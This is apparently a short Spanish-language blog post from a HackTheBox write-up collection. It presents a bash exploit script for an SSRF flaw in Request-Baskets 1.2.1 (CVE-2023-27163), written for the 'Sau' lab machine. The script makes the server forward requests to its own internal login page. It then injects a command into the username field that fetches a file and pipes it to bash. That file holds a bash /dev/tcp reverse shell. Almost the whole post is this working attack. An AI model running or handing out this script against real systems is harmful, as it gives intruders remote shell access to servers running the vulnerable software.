---

title: Request-Baskets 1.2.1
date: 2023-07-16 07:03 +0800
categories: [Scripts]
tags: [Scripts, HTB]
pin: true

---

# <font color="#c37437">Script</font>
Este script se uso para explotar un SSRF en la API de Request-Baskets en su versión 1.2.1. El script crea un archivo rev.sh  con la reverse shell y necesita los siguientes comandos:

  1. `python3 -m http.server 80` 
  2. `nc -nlvp [Port]`

-----------------------------------------------------------------------------------------------

```bash
#!/bin/bash

# Script para explotar un SSRF en la api de request-Baskets versión 1.2.1 usado para la máquina SAU de hackthebox
# POC - https://github.com/entr0pie/CVE-2023-27163
# CVE - https://nvd.nist.gov/vuln/detail/CVE-2023-27163

nameBasket=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)

echo "Antes de lanzar el script tenemos que crear un servidor HTTP y podenernos en escucha con 'NC'"
echo "\t python3 -m http.server 80"
echo "\t nc -nlvp [PortREV]"
echo "Intruduce la IP del servicio \"Request-baskets\""; read baseUrl # IP request-baskets
echo "Introduce tu IP para la revshell"; read local_IP # Nuestra IP para la revshell
echo "Introduce el PUERTO para la revshell"; read local_PORT # Puerto para la revshell

curl --location "http://$baseUrl:55555/api/baskets/$nameBasket" --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'

curl --location "http://$baseUrl:55555/api/baskets/$nameBasket" --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'

echo "bash -c 'bash -i >& /dev/tcp/$local_IP/$local_PORT 0>&1'" > rev.sh
curl "http://$baseUrl:55555/$nameBasket/login"  --data 'username=;`curl http://$local_IP/rev.sh | bash`'; rm rev.sh
```
